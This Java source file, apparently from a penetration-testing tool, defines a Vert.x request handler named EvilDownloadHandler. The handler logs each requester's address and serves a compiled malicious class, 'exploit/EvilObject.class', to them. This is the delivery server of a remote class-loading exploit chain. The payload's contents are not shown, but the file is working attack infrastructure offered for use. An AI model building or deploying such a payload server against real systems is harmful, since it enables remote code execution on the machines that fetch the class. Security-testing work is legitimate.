package de.marko.pentest.rest.handler;

import io.vertx.core.Handler;
import io.vertx.ext.web.RoutingContext;
import java.io.File;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * @author marko
 * @version 1.0.0.
 * @date 22.08.2017
 */
public class EvilDownloadHandler implements Handler<RoutingContext> {

	private final static Logger LOGGER = LoggerFactory.getLogger(EvilDownloadHandler.class);

	@Override
	public void handle(RoutingContext routingContext) {

		LOGGER.info(
			"Incoming Evil Request: " + routingContext.request().connection().remoteAddress()
				.host());

		File payload;

		try {
			ClassLoader classLoader = getClass().getClassLoader();
			payload = new File(classLoader.getResource("exploit/EvilObject.class").getFile());

			if (!payload.isFile()) {
				payload = new File("exploit/EvilObject.class");
			}

			if (payload == null | !payload.isFile()) {
				throw new NullPointerException("Cannot found payload.");
			}

		} catch (NullPointerException e) {
			LOGGER.error("Cannot found payload.");
			routingContext.response().setStatusCode(404).end();
			return;
		}

		routingContext.response().sendFile(payload.getAbsolutePath());

	}
}
